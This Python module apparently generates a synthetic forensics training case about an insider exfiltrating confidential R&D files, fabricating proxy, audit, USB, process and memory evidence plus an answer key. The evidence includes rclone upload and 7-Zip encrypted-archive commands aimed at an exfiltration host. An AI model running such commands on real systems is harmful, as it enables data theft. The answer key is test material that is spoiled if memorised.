"""Skenario: eksfiltrasi data oleh orang dalam (workstation Windows + proxy + file server)."""
from __future__ import annotations

from datetime import timedelta, timezone

from .base import (Build, Context, Evidence, clock_values, csv_cell, fill,
                   hexstr, hms, jitter, noise_strings, stamp)

DOMAINS_NORMAL = [
    "www.google.com", "outlook.office365.com", "teams.microsoft.com", "login.microsoftonline.com", "www.youtube.com",
    "web.whatsapp.com", "www.detik.com", "www.kompas.com", "github.com", "stackoverflow.com", "www.linkedin.com",
    "update.googleapis.com", "fonts.gstatic.com", "cdn.jsdelivr.net", "www.tokopedia.com", "docs.python.org",
    "drive.google.com", "www.dropbox.com", "wetransfer.com",
]
UA = ["Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/129.0.0.0+Safari/537.36",
      "Microsoft+Office/16.0", "Microsoft-CryptoAPI/10.0", "Teams/1.7.00"]


def build(ctx: Context) -> Build:
    r, P, fx = ctx.rng, ctx.bank["pools"], ctx.effects

    org = r.choice(P["organizations"])
    dom = org["netbios"]
    net = r.randint(16, 60)
    staff = r.sample(P["rnd_users"], 9)
    insider = staff[0]
    ws = f"WS-RND-{r.randint(1, 48):03d}"
    ws_ip = f"10.{net}.40.{r.randint(20, 230)}"
    fs = "FS-RND-01"
    exfil = r.choice(P["exfil_hosts"])
    tool = r.choice(P["tool_names"])
    tool_pid = r.randrange(5000, 14000, 4)
    remote = r.choice(P["rclone_remotes"])
    archive = fill(r.choice(P["archive_names"]), {"n": str(r.randint(10, 99))})
    archive_pw = "".join(r.choice("abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!#") for _ in range(14))
    usb = r.choice(P["usb_devices"])
    serial = hexstr(r, 20) if usb.get("hex", True) else str(r.randint(10**11, 10**12 - 1))
    folders = r.sample(P["secret_folders"], 4)
    secret_files = []
    for _ in range(r.randint(45, 110)):
        name = fill(r.choice(P["secret_files"]), {"n": str(r.randint(1, 99)), "v": str(r.randint(1, 9)),
                                                  "kode": r.choice(P["project_codes"])})
        secret_files.append(f"Rahasia\\{r.choice(folders)}\\{name}")
    secret_files = list(dict.fromkeys(secret_files))

    day = ctx.day
    t_read0 = jitter(r, day + timedelta(hours=19, minutes=r.randint(5, 50), seconds=r.randint(0, 59)))
    reads, t = [], t_read0
    for f in secret_files:
        reads.append((t, f))
        t = jitter(r, t + timedelta(seconds=r.randint(3, 25)))
    t_7z = jitter(r, t + timedelta(minutes=r.randint(2, 6)))
    t_usb = jitter(r, t_7z + timedelta(minutes=r.randint(4, 12)))
    t_up0 = jitter(r, t_usb + timedelta(minutes=r.randint(3, 9)))
    chunks = r.randint(24, 60)
    t_alert = (t_up0 + timedelta(minutes=r.randint(18, 28))).replace(microsecond=0)
    t_arrive = t_alert + timedelta(minutes=r.randint(25, 40), seconds=r.randint(0, 59))

    host = lambda dt: dt + ctx.drift  # noqa: E731
    values = {"org": org["name"], "org_short": org["short"], "ws": ws, "ws_ip": ws_ip, "insider": insider,
              "alert_time": hms(t_alert), "arrive_time": hms(t_arrive), "fs": fs, "domain": dom}

    # ── EV-001 log proxy (W3C ELFF, UTC) ───────────────────────────────────
    utc = timezone.utc
    plines = []

    def pl(dt, ip, user, method, h, path, status, cs, sc, ua):
        u = dt.astimezone(utc)
        plines.append((dt, f"{u.strftime('%Y-%m-%d %H:%M:%S')} {r.randint(12, 4800)} {ip} {user} {method} {h} "
                           f"{path} {status} {cs} {sc} {ua}"))

    others = [(u, f"10.{net}.40.{r.randint(20, 230)}") for u in staff[1:]]
    day_start = day + timedelta(hours=7, minutes=30)
    span = int((t_arrive - day_start).total_seconds())
    for _ in range(r.randint(2400, 3200)):
        dt = jitter(r, day_start + timedelta(seconds=r.randint(0, span)))
        late = dt.hour >= 18
        u, ip = (insider, ws_ip) if (r.random() < (0.5 if late else 0.12)) else r.choice(others)
        h = r.choice(DOMAINS_NORMAL)
        method = r.choices(["GET", "POST", "CONNECT"], [70, 12, 18])[0]
        cs = r.randint(300, 1800) if method != "POST" else r.randint(900, 120_000)
        pl(dt, ip, f"{dom}\\{u}", method, h, "/" if method == "CONNECT" else f"/{hexstr(r, 6).lower()}",
           r.choice([200, 200, 200, 204, 304, 302]), cs, r.randint(400, 900_000), r.choice(UA))
    # kolega yang juga mengakses host yang sama (hanya unduh)
    for _ in range(r.randint(3, 7)):
        u, ip = r.choice(others)
        dt = jitter(r, day_start + timedelta(seconds=r.randint(0, span)))
        pl(dt, ip, f"{dom}\\{u}", "GET", exfil, f"/d/{hexstr(r, 8).lower()}", 200, r.randint(400, 900),
           r.randint(200_000, 9_000_000), UA[0])
    total = 0
    t = jitter(r, t_up0 - timedelta(minutes=2))
    for path in ("/", "/api/account"):
        cs = r.randint(500, 1400)
        total += cs
        pl(t, ws_ip, f"{dom}\\{insider}", "GET", exfil, path, 200, cs, r.randint(800, 9000), "rclone/v1.68.1")
        t = jitter(r, t + timedelta(seconds=r.randint(1, 5)))
    t = t_up0
    for i in range(chunks):
        cs = r.randint(8_000_000, 64_000_000)
        total += cs
        pl(t, ws_ip, f"{dom}\\{insider}", "PUT", exfil, f"/upload/{hexstr(r, 16).lower()}/{i}", 201, cs,
           r.randint(180, 420), "rclone/v1.68.1")
        t = jitter(r, t + timedelta(seconds=r.randint(15, 50)))
    plines.sort(key=lambda x: x[0])
    proxy_txt = ("#Software: SGOS 7.3.12.1\n#Version: 1.0\n"
                 f"#Date: {day.astimezone(utc).strftime('%Y-%m-%d %H:%M:%S')}\n"
                 "#Fields: date time time-taken c-ip cs-username cs-method cs-host cs-uri-path sc-status cs-bytes sc-bytes cs(User-Agent)\n"
                 + "\n".join(x[1] for x in plines) + "\n")

    # ── EV-002 audit akses file server (5145) ──────────────────────────────
    arows = ["TimeCreated,EventId,SubjectUserName,IpAddress,ShareName,RelativeTargetName,AccessList"]
    audit = []
    public = P["public_files"]
    for _ in range(r.randint(500, 750)):
        dt = jitter(r, day + timedelta(hours=r.randint(8, 16), minutes=r.randint(0, 59), seconds=r.randint(0, 59)))
        u, ip = (insider, ws_ip) if r.random() < 0.15 else r.choice(others)
        audit.append((dt, u, ip, f"Umum\\{fill(r.choice(public), {'n': str(r.randint(1, 40))})}"))
    for _ in range(r.randint(12, 30)):
        dt = jitter(r, day + timedelta(hours=r.randint(9, 15), minutes=r.randint(0, 59)))
        u, ip = others[0]
        audit.append((dt, u, ip, r.choice(secret_files)))
    for dt, f in reads:
        audit.append((dt, insider, ws_ip, f))
    audit.sort(key=lambda x: x[0])
    for dt, u, ip, f in audit:
        arows.append(",".join(csv_cell(x) for x in (
            dt.strftime("%Y-%m-%d %H:%M:%S.") + f"{dt.microsecond:06d}0", 5145, f"{dom}\\{u}", ip, "\\\\*\\RnD", f,
            "%%4416 (ReadData)")))
    audit_txt = "\n".join(arows) + "\n"

    # ── EV-003 setupapi.dev.log ────────────────────────────────────────────
    def dev_section(dt, desc, status="SUCCESS"):
        h = host(dt)
        stamp = h.strftime("%Y/%m/%d %H:%M:%S.") + f"{h.microsecond // 1000:03d}"
        end = h + timedelta(milliseconds=r.randint(300, 1900))
        return [f">>>  [Device Install (Hardware initiated) - {desc}]", f">>>  Section start {stamp}",
                f"     ump: Creating Install Process: DrvInst.exe {h.strftime('%H:%M:%S')}.{r.randint(100, 999)}",
                f"     ndv: Retrieving device info...", f"     ndv: Setting device parameters...",
                f"     dvi: {{Build Driver List}} {h.strftime('%H:%M:%S')}.{r.randint(100, 999)}",
                f"<<<  Section end {end.strftime('%Y/%m/%d %H:%M:%S.')}{end.microsecond // 1000:03d}",
                f"<<<  [Exit status: {status}]", ""]

    setup = ["[Device Install Log]", "     OS Version = 10.0.22631", "     Service Pack = 0.0",
             "     Suite = 0x0100", "     ProductType = 1", "     Architecture = amd64", "",
             "[BeginLog]", ""]
    olds = []
    for dev in r.sample(P["old_devices"], 4):
        dt = stamp(r, day - timedelta(days=r.randint(20, 300), minutes=r.randint(0, 600)))
        olds.append((dt, fill(dev, {"s": hexstr(r, 16)})))
    olds.append((t_usb, f"USB\\VID_{usb['vid']}&PID_{usb['pid']}\\{serial}"))
    olds.append((t_usb + timedelta(milliseconds=r.randint(250, 700)),
                 f"USBSTOR\\Disk&Ven_{usb['ven']}&Prod_{usb['prod']}&Rev_{usb['rev']}\\{serial}&0"))
    olds.append((t_usb + timedelta(milliseconds=r.randint(1400, 2600)),
                 f"SWD\\WPDBUSENUM\\_??_USBSTOR#Disk&Ven_{usb['ven']}&Prod_{usb['prod']}&Rev_{usb['rev']}#{serial}&0"
                 "#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}"))
    for dt, desc in sorted(olds):
        setup += dev_section(dt, desc)
    usb_txt = "\n".join(setup) + "\n"

    # ── EV-004 proses live (wmic) ──────────────────────────────────────────
    procs = [("System", 4, 0, ""), ("smss.exe", 412, 4, "\\SystemRoot\\System32\\smss.exe"),
             ("csrss.exe", 560, 548, "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows"),
             ("wininit.exe", 648, 548, "wininit.exe"), ("services.exe", 720, 648, "C:\\Windows\\system32\\services.exe"),
             ("lsass.exe", 740, 648, "C:\\Windows\\system32\\lsass.exe")]
    pid = 900
    user_apps = [("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"),
                 ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
                 ("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p"),
                 ("edr-agent.exe", "\"C:\\Program Files\\EDR\\edr-agent.exe\""),
                 ("explorer.exe", "C:\\Windows\\Explorer.EXE"),
                 ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
                 ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"),
                 ("OUTLOOK.EXE", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
                 ("ms-teams.exe", "\"C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe\""),
                 ("OneDrive.exe", f"\"C:\\Users\\{insider}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"),
                 ("Code.exe", f"\"C:\\Users\\{insider}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\""),
                 ("cmd.exe", "\"C:\\Windows\\system32\\cmd.exe\""),
                 ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0x4")]
    cmd_pid = None
    for name, cl in user_apps:
        pid += r.randrange(40, 900, 4)
        procs.append((name, pid, 720 if "svchost" in name or "edr" in name else 5012, cl))
        if name == "cmd.exe":
            cmd_pid = pid
    procs.append((tool, tool_pid, cmd_pid,
                  f"\"C:\\Users\\{insider}\\AppData\\Local\\Temp\\{tool}\" copy \"D:\\Arsip\\{archive}\" "
                  f"{remote}:backup --transfers 4 --stats 30s"))
    procs.append(("WMIC.exe", pid + 3216, 2290, "wmic process get Name,ProcessId,ParentProcessId,CommandLine /format:csv"))
    procs.sort(key=lambda x: x[1])
    live = ["Node,CommandLine,Name,ParentProcessId,ProcessId"]
    for name, p, pp, cl in procs:
        live.append(",".join(csv_cell(x) for x in (ws, cl, name, pp, p)))
    live_txt = "\n".join(live) + "\n"

    # ── EV-005 strings memori ──────────────────────────────────────────────
    mem = noise_strings(r, 2600, ["rclone.conf", "[" + remote + "]", f"type = {r.choice(['webdav', 'ftp', 's3'])}",
                                  f"url = https://{exfil}/dav", "D:\\Arsip", "chrome_elf.dll"])
    if "memory_lost" not in fx:
        mem.insert(r.randint(200, 2400), f"\"C:\\Program Files\\7-Zip\\7z.exe\" a -t7z -p{archive_pw} -mhe=on "
                                         f"\"D:\\Arsip\\{archive}\" \"\\\\{fs}\\RnD\\Rahasia\\*\"")
    mem_txt = "\n".join(mem) + "\n"

    # ── EV-006 listing isi flashdisk (via write blocker) ───────────────────
    usb_files = [(t_usb + timedelta(minutes=2), r.randint(800_000_000, 2_400_000_000), archive)]
    for name in r.sample(P["personal_files"], 5):
        usb_files.append((stamp(r, day - timedelta(days=r.randint(3, 200), minutes=r.randint(0, 900))), r.randint(40_000, 30_000_000), name))
    t_scene = t_arrive + timedelta(minutes=30)
    lst = ["Path\tSize\tCreated\tModified\tAccessed"]
    for dt, size, name in sorted(usb_files):
        acc = t_scene if "usb_contaminated" in fx else dt
        lst.append(f"\\{name}\t{size}\t{dt.strftime('%Y-%m-%d %H:%M')}\t{dt.strftime('%Y-%m-%d %H:%M')}\t{acc.strftime('%Y-%m-%d %H:%M')}")
    if "usb_contaminated" in fx:
        lst.append(f"\\System Volume Information\\IndexerVolumeGuid\t76\t{t_scene.strftime('%Y-%m-%d %H:%M')}\t"
                   f"{t_scene.strftime('%Y-%m-%d %H:%M')}\t{t_scene.strftime('%Y-%m-%d %H:%M')}")
        lst.append(f"\\System Volume Information\\WPSettings.dat\t12\t{t_scene.strftime('%Y-%m-%d %H:%M')}\t"
                   f"{t_scene.strftime('%Y-%m-%d %H:%M')}\t{t_scene.strftime('%Y-%m-%d %H:%M')}")
    usbimg_txt = (f"# FTK Imager — {usb['ven']} {usb['prod']} (S/N {serial})\n# Media dibaca melalui write blocker\n"
                  + "\n".join(lst) + "\n")

    t_collect = t_arrive + timedelta(minutes=12)
    ev_list = [
        Evidence("proxy", "EV-001", "EV-001_PROXY-01_access_w3c.log", "Log web proxy (UTC)", "PROXY-01", False,
                 "Ekspor dari appliance proxy", proxy_txt, acquired_at=t_collect),
        Evidence("fileaudit", "EV-002", f"EV-002_{fs}_Security_5145.csv", "Audit akses share RnD", fs, False,
                 "EvtxECmd (filter EventId 5145)", audit_txt, acquired_at=t_collect + timedelta(minutes=5)),
        Evidence("usb", "EV-003", f"EV-003_{ws}_setupapi.dev.log", "Log instalasi perangkat", ws, False,
                 "KAPE (C:\\Windows\\INF\\setupapi.dev.log)", usb_txt, acquired_at=t_collect + timedelta(minutes=50)),
        Evidence("live", "EV-004", f"EV-004_{ws}_processes.csv", "Daftar proses + command line", ws, True,
                 "wmic process (dari USB responder)", live_txt, acquired_at=t_collect + timedelta(minutes=9)),
        Evidence("memory", "EV-005", f"EV-005_{ws}_memdump.strings.txt", "Strings dari image RAM (16 GB)", ws, True,
                 "WinPmem → strings -a -n 8", mem_txt, acquired_at=t_collect + timedelta(minutes=14)),
        Evidence("usbimg", "EV-006", "EV-006_USB_listing.tsv", "Listing isi flashdisk", "Flashdisk di meja", False,
                 "FTK Imager + write blocker", usbimg_txt, acquired_at=t_arrive + timedelta(hours=3)),
    ]
    for e in ev_list:
        if e.key == "live" and "live_lost" in fx:
            e.available, e.reason = False, "Workstation sudah dimatikan sebelum live response."
        if e.key == "memory" and ({"memory_lost", "live_lost"} & fx):
            e.available, e.reason = False, "RAM tidak sempat diakuisisi — isi memori hilang."
        if e.key == "usbimg" and "usb_contaminated" in fx:
            e.note = "Flashdisk sempat dicolokkan tanpa write blocker — metadata berubah."
    custody = []
    if "usb_custody_gap" in fx:
        custody.append("Flashdisk berpindah ke HR tanpa formulir serah terima — terdapat celah rantai kustodi ±40 menit.")
    if "admissibility_risk" in fx:
        custody.append("Akuisisi dilakukan tanpa dasar kewenangan tertulis — keabsahan bukti berisiko digugat.")
    if "legal_violation" in fx:
        custody.append("Terdapat tindakan di luar kewenangan (akses akun/perangkat pribadi) — berpotensi melanggar UU ITE & UU PDP.")

    o = ctx.outcomes
    at = lambda m: t_arrive + timedelta(minutes=m, seconds=r.randint(0, 50))  # noqa: E731
    t_clock = at(5)
    scene = [
        (t_alert, f"DLP & proxy memicu alert: unggahan volume besar dari {ws} ({ws_ip}) ke layanan penyimpanan publik."),
        (t_arrive, f"Tim CSIRT tiba di lantai R&D. {ws} menyala dan tidak terkunci; {insider} sedang di pantry."),
        (at(1), o["D3"]),
        (at(3), o["D1"]),
        (t_clock, o["D4"]),
        (at(9), o["D2"]),
        (at(30), o["D5"]),
        (at(90), "Seluruh bukti di-hash, disegel, dan diserahkan ke evidence custodian."),
    ]
    clock = clock_values(ctx, values, t_clock)
    scene = [(t, fill(msg, clock)) for t, msg in scene]

    truth = {
        "F1": f"{dom}\\{insider}", "F2": exfil, "F3": str(total), "F4": reads[0][1].split("\\")[-1],
        "F5": serial, "F6": hms(t_usb), "F7": f"{tool} {tool_pid}", "F8": archive_pw,
    }
    timeline = [
        (reads[0][0], f"{insider} mulai membaca folder `Rahasia` di {fs} ({len(reads)} file)"),
        (t_7z, f"Arsip terenkripsi `{archive}` dibuat dengan 7-Zip"),
        (t_usb, f"Flashdisk {usb['ven']} {usb['prod']} (S/N {serial}) pertama kali dicolokkan ke {ws}"),
        (t_up0, f"Unggahan `{archive}` ke {exfil} dimulai via {tool} ({chunks} potongan)"),
        (t_alert, "Alert DLP/proxy diterima SOC"),
        (t_arrive, "Tim CSIRT tiba di lokasi"),
    ]
    iocs = [("Akun", f"{dom}\\{insider}"), ("Workstation", f"{ws} ({ws_ip})"), ("Tujuan exfil", exfil),
            ("Alat", f"{tool} (rclone)"), ("Arsip", archive), ("Flashdisk", f"{usb['ven']} {usb['prod']} S/N {serial}"),
            ("Volume terunggah", f"{total:,} byte".replace(",", "."))]
    return Build(host=ws, evidence=ev_list, truth=truth, scene_log=scene, timeline=timeline, facts=values,
                 iocs=iocs, clock_recorded="drift_unknown" not in fx, custody_notes=custody)
